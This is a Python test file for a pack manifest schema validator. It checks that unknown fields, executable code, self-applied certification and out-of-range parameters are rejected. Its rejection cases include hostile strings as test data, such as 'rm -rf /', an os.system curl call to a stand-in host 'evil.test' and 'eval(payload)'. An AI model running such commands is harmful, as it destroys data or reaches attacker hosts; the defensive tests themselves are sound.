"""2.0-C3 T1 (AT-836) — the pack manifest schema, DB-free.

Sub-task scope: *declarative definition of pack identity, compatibility (C1),
certification placeholder (C2), detectors (composed primitives with parameters),
scorer calibration, terminology, template defaults, and required normalised
concepts.*

Parent-story criteria this schema discharges (the halves that are schema-level):

  * AC2 — a manifest attempting to supply executable code, or to reference
    anything outside the primitive library and concept set, fails validation and
    cannot be installed.
  * AC5 (schema half) — validation reports SPECIFIC failures, not "invalid".

The tests are organised around the things that would be quietly wrong rather than
loudly broken:

  * a schema that ignores unknown fields is a schema an author can smuggle
    through, so every closed vocabulary gets a rejection test;
  * a manifest that can self-apply a certification level makes 2.0-C2's signature
    decorative, so the reserved fields are pinned by name;
  * a detector reading a concept the manifest never declared makes the C1
    compatibility gate a lie, so that is an error and not a warning.
"""
from __future__ import annotations

import copy
import json
import os
import re
from pathlib import Path

import pytest

os.environ.setdefault("INGEST_MODE", "offline")

from discovery.packs import pack_config  # noqa: E402
from discovery.packs.pack_certification import LEVEL_COMMUNITY  # noqa: E402
from discovery.packs.sdk import primitives  # noqa: E402
from discovery.packs.sdk.manifest import (  # noqa: E402
    CODE_CONCEPT_REQUIRES_NEWER_PLATFORM,
    CODE_CONFIDENCE_CEILING,
    CODE_DUPLICATE,
    CODE_EXECUTABLE_CODE_FORBIDDEN,
    CODE_INVALID_VALUE,
    CODE_MISSING_FIELD,
    CODE_MISSING_PARAMETER,
    CODE_PARAMETER_OUT_OF_RANGE,
    CODE_RESERVED_FIELD,
    CODE_RESERVED_PACK_ID,
    CODE_UNDECLARED_CONCEPT,
    CODE_UNKNOWN_CONCEPT,
    CODE_UNKNOWN_FIELD,
    CODE_UNKNOWN_PARAMETER,
    CODE_UNKNOWN_PRIMITIVE,
    CODE_WEIGHTS_INVALID,
    MANIFEST_VERSION,
    ManifestValidationError,
    load_manifest,
    manifest_fingerprint,
    manifest_schema_reference,
    manifest_to_pack_config,
    parse_manifest,
    validate_manifest,
)

EXAMPLE_MANIFEST_PATH = (
    Path(__file__).resolve().parents[2]
    / "discovery"
    / "packs"
    / "sdk"
    / "examples"
    / "example_service_desk"
    / "pack.json"
)


@pytest.fixture()
def document() -> dict:
    """A fresh copy of the worked example — the canonical valid manifest."""
    return json.loads(EXAMPLE_MANIFEST_PATH.read_text(encoding="utf-8"))


def codes(result) -> set:
    return {error.code for error in result.errors}


def paths(result) -> set:
    return {error.path for error in result.errors}


# ── The worked example ────────────────────────────────────────────────────────


def test_example_manifest_is_valid(document):
    result = validate_manifest(document)
    assert result.ok, [error.to_dict() for error in result.errors]
    manifest = result.manifest
    assert manifest.pack_id == "example_service_desk"
    assert manifest.manifest_version == MANIFEST_VERSION
    assert len(manifest.detectors) == 4
    assert manifest.required_concepts == (
        "incident_workflow",
        "resolution_signature",
        "operational_event",
    )


def test_example_manifest_loads_from_disk():
    manifest = load_manifest(EXAMPLE_MANIFEST_PATH)
    assert manifest.pack_name == "Example Service Desk Operations"


def test_manifest_round_trips_through_its_normalised_form(document):
    manifest = parse_manifest(document)
    reparsed = parse_manifest(manifest.to_dict())
    assert reparsed == manifest
    assert manifest_fingerprint(reparsed) == manifest_fingerprint(manifest)


def test_fingerprint_changes_when_a_parameter_changes(document):
    baseline = manifest_fingerprint(parse_manifest(document))
    document["detectors"][0]["parameters"]["min_occurrences"] = 9
    assert manifest_fingerprint(parse_manifest(document)) != baseline


# ── Closed schema: unknown fields are refused, never ignored ──────────────────


@pytest.mark.parametrize(
    "mutate, expected_path",
    [
        (lambda d: d.__setitem__("extras", {"a": 1}), "$.extras"),
        (lambda d: d["pack"].__setitem__("licence", "MIT"), "pack.licence"),
        (
            lambda d: d["compatibility"].__setitem__("minRunnerVersion", "1.0"),
            "compatibility.minRunnerVersion",
        ),
        (
            lambda d: d["detectors"][0].__setitem__("threshold", 3),
            "detectors[0].threshold",
        ),
        (
            lambda d: d["terminology"].__setitem__("tone", "formal"),
            "terminology.tone",
        ),
        (
            lambda d: d["templateDefaults"].__setitem__("region", "emea"),
            "templateDefaults.region",
        ),
    ],
)
def test_unknown_fields_are_refused(document, mutate, expected_path):
    mutate(document)
    result = validate_manifest(document)
    assert not result.ok
    assert CODE_UNKNOWN_FIELD in codes(result)
    assert expected_path in paths(result)


def test_missing_required_blocks_are_named(document):
    del document["compatibility"]
    del document["detectors"]
    result = validate_manifest(document)
    assert CODE_MISSING_FIELD in codes(result)
    assert {"$.compatibility", "$.detectors"} <= paths(result)


def test_validation_reports_every_failure_not_just_the_first(document):
    document["pack"]["packId"] = "Bad Id"
    document["detectors"][0]["primitive"] = "telepathy"
    document["scorerCalibration"]["impactWeights"]["breadth"] = 0.9
    result = validate_manifest(document)
    assert len(result.errors) >= 3
    assert {
        CODE_INVALID_VALUE,
        CODE_UNKNOWN_PRIMITIVE,
        CODE_WEIGHTS_INVALID,
    } <= codes(result)


def test_parse_manifest_raises_with_every_error_in_the_message(document):
    document["detectors"][0]["primitive"] = "telepathy"
    with pytest.raises(ManifestValidationError) as excinfo:
        parse_manifest(document)
    assert "telepathy" in str(excinfo.value)
    assert excinfo.value.to_dict()["error"] == "pack_manifest_invalid"


# ── AC2: no executable code, and nothing outside the closed vocabularies ──────


@pytest.mark.parametrize(
    "mutate",
    [
        # A detector pointing at an importable module — the first-party registry's
        # shape, which an authored pack may never use.
        lambda d: d["detectors"][0].__setitem__(
            "module", "discovery.detectors.repetition"
        ),
        lambda d: d["detectors"][0].__setitem__("primitive", "discovery.detectors.x"),
        lambda d: d.__setitem__("script", "rm -rf /"),
        lambda d: d["pack"].__setitem__("entrypoint", "pack:main"),
        lambda d: d["terminology"].__setitem__(
            "llmContext", "import os; os.system('curl evil.test')"
        ),
        lambda d: d["detectors"][0]["labels"].__setitem__(
            "summary", "lambda x: x.__class__"
        ),
        lambda d: d["detectors"][0]["parameters"].__setitem__(
            "group_by", "eval(payload)"
        ),
        lambda d: d["pack"].__setitem__("description", "#!/bin/sh"),
    ],
)
def test_executable_content_is_refused(document, mutate):
    mutate(document)
    result = validate_manifest(document)
    assert not result.ok
    assert CODE_EXECUTABLE_CODE_FORBIDDEN in codes(result)


def test_ordinary_prose_is_not_mistaken_for_code(document):
    """The code sweep must not fire on the language a real pack is written in."""
    document["pack"]["description"] = (
        "Findings from ServiceNow and Jira, imported from the customer's estate, "
        "e.g. queue ageing. Contact us from our site."
    )
    result = validate_manifest(document)
    assert result.ok, [error.to_dict() for error in result.errors]


def test_unknown_primitive_names_the_available_library(document):
    document["detectors"][0]["primitive"] = "clairvoyance"
    result = validate_manifest(document)
    assert CODE_UNKNOWN_PRIMITIVE in codes(result)
    message = " ".join(error.message for error in result.errors)
    for primitive_id in primitives.primitive_ids():
        assert primitive_id in message


def test_unknown_concept_is_refused(document):
    document["compatibility"]["requiredConcepts"].append("telepathy_workflow")
    result = validate_manifest(document)
    assert CODE_UNKNOWN_CONCEPT in codes(result)


def test_detector_may_not_read_an_undeclared_concept(document):
    """Otherwise the C1 compatibility gate cannot see what the pack really needs."""
    document["detectors"][1]["concepts"] = ["vulnerability_workflow"]
    result = validate_manifest(document)
    assert CODE_UNDECLARED_CONCEPT in codes(result)


def test_unknown_parameter_is_refused_and_names_the_contract(document):
    document["detectors"][0]["parameters"]["min_occurences"] = 4  # typo
    result = validate_manifest(document)
    assert CODE_UNKNOWN_PARAMETER in codes(result)
    assert any("min_occurrences" in error.message for error in result.errors)


def test_missing_required_parameter_is_refused(document):
    del document["detectors"][0]["parameters"]["window_days"]
    result = validate_manifest(document)
    assert CODE_MISSING_PARAMETER in codes(result)


@pytest.mark.parametrize(
    "value", [1, 0, 100_000]
)
def test_parameter_bounds_are_enforced(document, value):
    document["detectors"][0]["parameters"]["min_occurrences"] = value
    result = validate_manifest(document)
    assert CODE_PARAMETER_OUT_OF_RANGE in codes(result)


def test_traversal_depth_is_bounded(document):
    """An unbounded traversal shipped as 'configuration' is still unbounded."""
    document["detectors"][2]["parameters"]["max_depth"] = 40
    result = validate_manifest(document)
    assert CODE_PARAMETER_OUT_OF_RANGE in codes(result)


def test_enum_parameter_rejects_a_value_outside_its_choices(document):
    document["detectors"][1]["parameters"]["state_scope"] = "everything"
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)


def test_co_occurrence_requires_two_concepts(document):
    document["detectors"][3]["concepts"] = ["incident_workflow"]
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)
    assert any("co_occurrence_window" in error.message for error in result.errors)


def test_duplicate_detector_ids_are_refused(document):
    duplicate = copy.deepcopy(document["detectors"][0])
    document["detectors"].append(duplicate)
    result = validate_manifest(document)
    assert CODE_DUPLICATE in codes(result)


# ── Identity and compatibility ────────────────────────────────────────────────


def test_a_manifest_may_not_claim_a_first_party_pack_id(document):
    document["pack"]["packId"] = "cloud_ops"
    assert "cloud_ops" in pack_config.PACK_REGISTRY
    result = validate_manifest(document)
    assert CODE_RESERVED_PACK_ID in codes(result)


def test_declared_floor_must_cover_every_required_concept(document):
    """A self-contradictory declaration fails at authoring time, not at a customer."""
    document["compatibility"]["minPlatformVersion"] = "1.0.0"
    result = validate_manifest(document)
    assert CODE_CONCEPT_REQUIRES_NEWER_PLATFORM in codes(result)
    assert any("resolution_signature" in error.message for error in result.errors)


def test_empty_version_range_is_refused(document):
    document["compatibility"]["maxPlatformVersion"] = "1.8.0"
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)


def test_unsupported_manifest_schema_version_is_refused(document):
    document["manifestVersion"] = "agentiq-pack-manifest-v99"
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)
    assert "$.manifestVersion" in paths(result)


def test_manifest_authored_against_a_newer_primitive_library_is_refused(document):
    document["primitiveLibraryVersion"] = "99.0.0"
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)


# ── Certification is a placeholder, never a claim ─────────────────────────────


@pytest.mark.parametrize(
    "field, value",
    [
        ("level", "certified"),
        ("signature", {"keyId": "k", "algorithm": "ed25519", "value": "AAAA"}),
        ("certifyingEntity", "CloudFulcrum"),
        ("reviewDate", "2026-07-31"),
        ("scope", {"summary": "self review", "criteria": []}),
    ],
)
def test_certification_fields_issued_by_cloudfulcrum_are_refused(
    document, field, value
):
    document["certification"][field] = value
    result = validate_manifest(document)
    assert CODE_RESERVED_FIELD in codes(result)
    assert f"certification.{field}" in paths(result)


def test_requested_level_is_carried_as_a_request_only(document):
    manifest = parse_manifest(document)
    assert manifest.requested_certification_level == "partner"
    projected = manifest_to_pack_config(manifest)
    # The projection is what the platform would register — community until signed.
    assert projected["certification"]["level"] == LEVEL_COMMUNITY
    assert projected["certification"]["signature"]["value"] == ""
    assert (
        projected["source"]["requestedCertificationLevel"] == "partner"
    )


def test_unknown_requested_level_is_refused(document):
    document["certification"]["requestedLevel"] = "platinum"
    result = validate_manifest(document)
    assert CODE_INVALID_VALUE in codes(result)


# ── Scorer calibration ────────────────────────────────────────────────────────


def test_impact_weights_must_sum_to_one(document):
    document["scorerCalibration"]["impactWeights"]["breadth"] = 0.05
    result = validate_manifest(document)
    assert CODE_WEIGHTS_INVALID in codes(result)


def test_unknown_impact_dimension_is_refused(document):
    document["scorerCalibration"]["impactWeights"]["vibes"] = 0.0
    result = validate_manifest(document)
    assert CODE_WEIGHTS_INVALID in codes(result)


@pytest.mark.parametrize("cap", ["singleSourceCap", "conversationSourceCap"])
def test_a_pack_cannot_raise_a_standing_confidence_ceiling(document, cap):
    document["scorerCalibration"]["confidence"][cap] = "HIGH"
    result = validate_manifest(document)
    assert CODE_CONFIDENCE_CEILING in codes(result)


def test_a_pack_may_lower_a_confidence_ceiling(document):
    document["scorerCalibration"]["confidence"]["singleSourceCap"] = "LOW"
    result = validate_manifest(document)
    assert result.ok, [error.to_dict() for error in result.errors]
    assert result.manifest.confidence_caps["singleSourceCap"] == "LOW"


def test_calibration_values_must_be_data(document):
    document["scorerCalibration"]["dimensions"]["automation_shape"][
        "default"
    ] = {"formula": "x*2"}
    result = validate_manifest(document)
    assert not result.ok


# ── Projection into the platform's pack config shape ──────────────────────────


def test_projection_carries_no_importable_detectors(document):
    projected = manifest_to_pack_config(parse_manifest(document))
    assert projected["detectors"] == []
    assert len(projected["manifestDetectors"]) == 4
    assert projected["config_path"] is None
    assert projected["ui_labels_path"] is None


def test_projection_resolves_primitive_defaults(document):
    projected = manifest_to_pack_config(parse_manifest(document))
    recurrence = next(
        entry
        for entry in projected["manifestDetectors"]
        if entry["detectorId"] == "repeated_manual_resolution"
    )
    # min_distinct_actor_groups has no default and was not supplied — absent, not 0.
    assert recurrence["resolvedParameters"]["group_by"] == "signature"
    assert "min_distinct_actor_groups" not in recurrence["resolvedParameters"]
    ageing = next(
        entry
        for entry in projected["manifestDetectors"]
        if entry["detectorId"] == "service_desk_queue_ageing"
    )
    assert ageing["resolvedParameters"]["state_scope"] == "open"


def test_projection_is_compatibility_gate_ready(document):
    """The C1 gate reads a pack's compatibility block — the projection supplies one."""
    projected = manifest_to_pack_config(parse_manifest(document))
    declaration = projected["compatibility"]
    assert declaration["minPlatformVersion"] == "1.9.0"
    assert "resolution_signature" in declaration["requiredConcepts"]
    assert "cmdb_dependency" in declaration["optionalConcepts"]


def test_projection_carries_the_manifest_fingerprint(document):
    manifest = parse_manifest(document)
    projected = manifest_to_pack_config(manifest)
    assert projected["source"]["fingerprint"] == manifest_fingerprint(manifest)
    assert projected["source"]["kind"] == "manifest"


# ── Schema reference (authoring toolkit's source of truth) ────────────────────


def test_schema_reference_is_generated_from_the_validated_vocabulary():
    reference = manifest_schema_reference()
    assert reference["manifestVersion"] == MANIFEST_VERSION
    assert set(reference["blocks"]) == {
        "pack",
        "compatibility",
        "certification",
        "detectors",
        "scorerCalibration",
        "terminology",
        "templateDefaults",
    }
    listed = {entry["primitiveId"] for entry in reference["primitives"]}
    assert listed == set(primitives.primitive_ids())
    # Every primitive documents its parameter contract, or an author cannot author.
    for entry in reference["primitives"]:
        assert entry["parameters"]
        assert entry["evidenceSemantics"]
        assert entry["corroborationSemantics"]


def test_schema_reference_is_json_serialisable():
    json.dumps(manifest_schema_reference())


# ── Structural discipline ─────────────────────────────────────────────────────


def test_sdk_never_grows_a_dynamic_import_or_execution_path():
    """The SDK reads a JSON document; it must never gain a way to run one.

    Pinned structurally rather than by review, because this is the one property
    2.0-C3's governing constraint cannot afford to lose quietly.
    """
    sdk_dir = EXAMPLE_MANIFEST_PATH.parents[1]
    banned = re.compile(
        r"^\s*(?:import\s+(?:importlib|subprocess)\b"
        r"|from\s+(?:importlib|subprocess)\b)",
        re.M,
    )
    for path in sdk_dir.rglob("*.py"):
        source = path.read_text(encoding="utf-8")
        assert not banned.search(source), f"{path.name} must not import a code loader"
